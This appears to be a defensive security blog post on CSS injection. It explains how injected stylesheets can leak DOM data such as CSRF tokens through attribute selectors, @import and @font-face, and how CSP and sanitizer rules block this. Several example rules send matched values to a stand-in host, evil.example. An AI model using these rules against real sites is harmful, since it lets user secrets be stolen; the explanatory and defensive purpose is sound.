# CSS Injection: How Stylesheets Steal Data Without JavaScript

Most XSS guidance stops at HTML and JavaScript. Sanitize tags, escape output, enforce a strict Content Security Policy on `script-src`, ship.

That checklist misses a whole class of attacks. **CSS injection** lets an attacker who can inject stylesheet rules read secrets from the DOM and phone them home — no `<script>`, no `eval()`, no obvious red flag in your JS bundle.

If your app accepts user-controlled CSS (profile themes, markdown styling, CMS "custom CSS" fields, email HTML, sandboxed embeds), you need a separate threat model for stylesheets.

## What CSS Injection Actually Is

CSS injection is not "ugly colors on the page." It is attacker-controlled selector logic running against your live DOM.

The browser must match selectors to elements, apply declarations, and resolve URLs in properties like `background-image` and `@import`. Each step can leak information:

- **Selector matching** reveals whether an element exists and what attribute values it carries.
- **URL loading** turns a match into an outbound HTTP request the attacker controls.
- **Import chains** pull in remote rules that extend the attack surface.

No JavaScript execution is required. The stylesheet alone is the program.

## The Classic Pattern: Attribute Selectors + `url()`

Imagine a page with a CSRF token in a hidden field:

```html
<input type="hidden" name="csrf" value="s3cr3tTok3n">
```

An injected stylesheet can probe the value character by character:

```css
input[name="csrf"][value^="s"] {
  background: url("https://evil.example/leak?s");
}
input[name="csrf"][value^="s3"] {
  background: url("https://evil.example/leak?s3");
}
input[name="csrf"][value^="s3c"] {
  background: url("https://evil.example/leak?s3c");
}
/* ... hundreds of rules for each prefix ... */
```

When a rule matches, the browser requests the background image URL. The attacker's server logs which prefix matched. Repeat for every position and charset; the full token arrives one request at a time.

The same technique works against:

- `<input type="password">` (before browsers fully locked down styling on password fields)
- `<meta name="csrf-token" content="...">` via `[content^="..."]`
- `data-*` attributes on any element
- Autofill-exposed values on text inputs in older browsers

Modern browsers have tightened some vectors (password field styling, mixed content blocking), but **hidden fields, meta tags, and DOM attributes** on same-origin pages remain viable in apps that allow arbitrary CSS.

## `@import` and Cascading Chains

Injection does not need every rule inline. A single line is enough:

```css
@import "https://evil.example/exfil.css";
```

The remote file can contain the full prefix rule set, updated without touching the victim site again. `@import` inside `<style>` blocks or linked stylesheets is still widely honored when CSP allows it.

Nested imports, `@font-face` with external `src` URLs, and `list-style-image: url(...)` are variations on the same theme: **matched selector → network request**.

## Font-Based Exfiltration

`@font-face` adds another channel:

```css
@font-face {
  font-family: "leak";
  src: url("https://evil.example/font?char=a");
}
input[value^="a"] {
  font-family: "leak", sans-serif;
}
```

If the custom font loads only when the selector matches, the server learns the prefix from the query string. Unicode-range subsets in `@font-face` can refine the probe further.

## Where This Shows Up in Real Apps

CSS injection is rarely the primary bug. It is the **second stage** after something else lets users supply CSS:

| Surface | Risk |
|---|---|
| Profile / theme editors | "Paste your custom CSS" on forums, portfolios, SaaS dashboards |
| Markdown with `<style>` | Renderers that allow raw HTML blocks |
| Email clients / webmail | HTML emails with embedded styles |
| CMS page builders | Per-page custom CSS panels |
| Browser extensions | Content scripts injecting into pages |
| PDF / print CSS pipelines | User-supplied print stylesheets |
| Sanitized HTML that allows `style=""` | Inline declarations with `background:url(...)` |

Teams often treat these as cosmetic features with no security review. The HTML sanitizer passes because there is no `<script>`. The CSS slips through because `style` attributes and `<link rel="stylesheet">` to user CDNs feel harmless.

## Why HTML Sanitization Is Not Enough

A typical allowlist permits:

```html
<style>
  .bio { color: red; }
</style>
```

or:

```html
<div style="background-image: url(https://evil.example/x)">
```

If your sanitizer allows `style` tags, `link[rel=stylesheet]`, or inline `style` with URL values, you have handed the attacker a general-purpose DOM query engine with network egress.

Blocking `<script>` does not help. CSP that only covers `script-src` does not help if `style-src` is `'unsafe-inline'` or `*`.

## What Content Security Policy Should Look Like

CSP is the primary platform defense:

```
Content-Security-Policy:
  default-src 'self';
  style-src 'self';
  img-src 'self';
  font-src 'self';
  connect-src 'self';
```

Key points:

- **`style-src 'self'`** — reject external and inline styles unless you nonce/hash the exact bytes you trust.
- **Avoid `'unsafe-inline'` on `style-src`** — inline CSS is CSS injection surface. If you must allow it, prefer hashes for known static blocks, not a blanket unsafe.
- **Restrict `img-src` and `font-src`** — exfiltration often exits through background URLs and font loads, not `connect-src`.
- **`base-uri 'self'`** — prevents `<base href>` from retargeting relative URLs in injected CSS.

For user-generated styling, the stronger pattern is **no CSS at all in user content**: map choices to a fixed set of server-defined class names (`theme-dark`, `accent-blue`) that you control.

## Detection and Review Checklist

Before shipping any "custom CSS" feature:

1. **Can users inject `@import`, `url()`, or `@font-face`?** If yes, treat as RCE-adjacent.
2. **Does the page render secrets in the DOM?** CSRF tokens, API keys in meta tags, PII in `data-*` attributes — all are probe targets.
3. **Is CSP enforced on `style-src`, `img-src`, and `font-src`?** Not just `script-src`.
4. **Are you allowing `style=""` in sanitized HTML?** URL-valued properties in inline styles are enough.
5. **Do third-party widgets inject styles into your origin?** Supply-chain CSS counts.

In development, load the page with a test stylesheet containing a single `input[value^="test"] { background: url(...); }` rule. If the request fires, your DOM is readable by CSS.

## Browser Mitigations (Partial)

Browsers have chipped away at the worst cases:

- **Password fields** — limited styling in modern engines to reduce keylogging-style CSS attacks.
- **Mixed content** — HTTPS pages cannot exfil via plain HTTP URLs (attackers use HTTPS endpoints).
- **Private prefetch** — some URL loads from CSS are deferred or deduplicated, slowing but not stopping exfiltration.

None of this replaces denying attacker-controlled CSS. If you did not compile the stylesheet yourself, assume it is hostile.

## The Honest Outlook

CSS is a programming language over your DOM. Injection turns selectors into boolean oracles and URLs into exfil channels. It is quieter than script-based XSS and often overlooked because styling features feel low-risk.

If you accept user CSS anywhere in your product, you need the same rigor as accepting user JavaScript — or, better, accept neither and offer predefined themes instead.

Audit your markdown renderers, profile editors, and CMS custom-style panels this week. That is where this bug lives in production.

---

*Posted in* **ALERT** · *July 2026*
